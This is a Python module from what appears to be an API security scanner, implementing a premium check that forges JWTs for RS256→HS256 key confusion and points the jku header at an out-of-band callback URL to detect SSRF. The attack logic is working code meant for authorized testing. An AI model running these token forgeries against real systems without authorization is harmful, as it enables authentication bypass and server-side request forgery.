"""JWT key confusion and header injection (premium, confirmation tier).

The blind ``broken_auth`` suite forges tokens that need no target-side secret
(alg=none, stripped/tampered signature, kid→empty-key). Two confirmation-tier
attacks need more, and live here:

- **RS256→HS256 key confusion** — fetch the server's public key from its JWKS,
  re-sign the token with HS256 using that public key as the HMAC secret, and send
  it. Acceptance proves the verifier picks its key by algorithm and HMACs with the
  public key — a verified auth bypass.
- **jku header injection** — point the token's ``jku`` header at an
  attacker-controlled key set and watch for the target fetching it (an SSRF via
  the JWT header), confirmed by an OAST callback.

Premium: off unless ``premium: true``.
"""
from __future__ import annotations

import json
import uuid

from app.domain.enums import Confidence, Severity
from app.engine.base import (
    EngineFinding,
    ScanContext,
    TargetOperation,
    method_is_allowed,
    render_path,
)
from app.engine.jwt_forge import (
    _looks_like_jwt,
    forge_hs256_confusion,
    forge_jku,
    pem_from_jwks,
)
from app.engine.resource_map import path_values

_PROTECTED_HINTS = ("/admin", "/account", "/user", "/me", "/order", "/profile", "/wallet")
_REJECTED = {401, 403}
_JWKS_PATH = "/.well-known/jwks.json"


def _looks_protected(op: TargetOperation) -> bool:
    if op.auth_scope:
        return True
    if op.path_params:
        return True
    p = op.path.lower()
    return any(h in p for h in _PROTECTED_HINTS)


def _bearer(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


class JwtConfusionCheck:
    key = "jwt_confusion"
    # Its findings need the scan's identities; a run that left one out could
    # not have re-found them, so the diff must not call them fixed.
    needs_identities = True
    #: Premium: reserved for the paid tier, off unless ``premium: true``.
    premium = True

    def run(self, ctx: ScanContext) -> list[EngineFinding]:
        if not ctx.premium:
            return []
        cred = next((c for c in ctx.credentials if _looks_like_jwt(c.secret)), None)
        if cred is None:
            return []
        findings: list[EngineFinding] = []
        if getattr(ctx.oob, "active", False):
            findings.extend(self._jku_oob(ctx, cred))
        findings.extend(self._rs256_confusion(ctx, cred))
        return findings

    def _jku_oob(self, ctx: ScanContext, cred) -> list[EngineFinding]:
        token = "j" + uuid.uuid4().hex[:16]
        url = ctx.oob.payload_url(token)
        if not url:
            return []
        forged = forge_jku(cred.secret, url)
        if forged is None:
            return []
        op = None
        for candidate in self._protected_ops(ctx):
            if not method_is_allowed(
                candidate.method, allow_mutation=ctx.allow_mutation
            ):
                continue
            path = render_path(candidate.path, path_values(candidate, ctx.resource_ids))
            r = ctx.probe.send(candidate.method, path, headers=_bearer(forged.token))
            if r is None:
                break
            op = candidate
        for interaction in ctx.oob.poll():
            if interaction.token == token:
                return [self._finding(cred, op, "jku_injection", interaction)]
        return []

    def _rs256_confusion(self, ctx: ScanContext, cred) -> list[EngineFinding]:
        jwks_resp = ctx.probe.send("GET", _JWKS_PATH, headers={})
        if jwks_resp is None or jwks_resp.status != 200:
            return []
        try:
            pem = pem_from_jwks(json.loads(jwks_resp.text))
        except (TypeError, ValueError):
            return []
        if pem is None:
            return []
        forged = forge_hs256_confusion(cred.secret, pem)
        if forged is None:
            return []
        for op in self._protected_ops(ctx):
            if not method_is_allowed(op.method, allow_mutation=ctx.allow_mutation):
                continue
            path = render_path(op.path, path_values(op, ctx.resource_ids))
            anon = ctx.probe.send(op.method, path, headers={})
            if anon is None or anon.status not in _REJECTED:
                continue
            r = ctx.probe.send(op.method, path, headers=_bearer(forged.token))
            if r is None:
                break
            if r.status < 400:
                return [self._finding(cred, op, "rs256_hs256_confusion", None)]
        return []

    def _protected_ops(self, ctx: ScanContext) -> list[TargetOperation]:
        return [op for op in ctx.operations if _looks_protected(op)]

    def _finding(self, cred, op, bypass_class, interaction) -> EngineFinding:
        evidence: dict[str, object] = {"bypass_class": bypass_class}
        title = "JWT header injection (jku) honored"
        description = (
            "The target fetched a client-supplied jku header URL (an out-of-band "
            "callback), so it trusts an attacker-controlled key location — an SSRF "
            "via the JWT header."
        )
        if op is not None:
            evidence["method"] = op.method
            evidence["route"] = op.path
        if interaction is not None:
            evidence["oob_protocol"] = interaction.protocol
            evidence["oob_source_ip"] = interaction.source_ip
            evidence["oob_token"] = interaction.token
        if bypass_class == "rs256_hs256_confusion":
            title = f"JWT key confusion (RS256→HS256) on {op.method} {op.path}"
            description = (
                f"{op.method} {op.path} accepted a token re-signed with HS256 using "
                "the server's public key as the HMAC secret. The verifier picks its "
                "key by algorithm, so an attacker who knows the public key (it is "
                "public) can forge any token."
            )
        return EngineFinding(
            check=self.key,
            confidence=Confidence.verified,
            owasp_id="API2:2023",
            severity=Severity.critical,
            title=title[:255],
            description=description,
            evidence=evidence,
            operation_id=op.id if op is not None else None,
        )
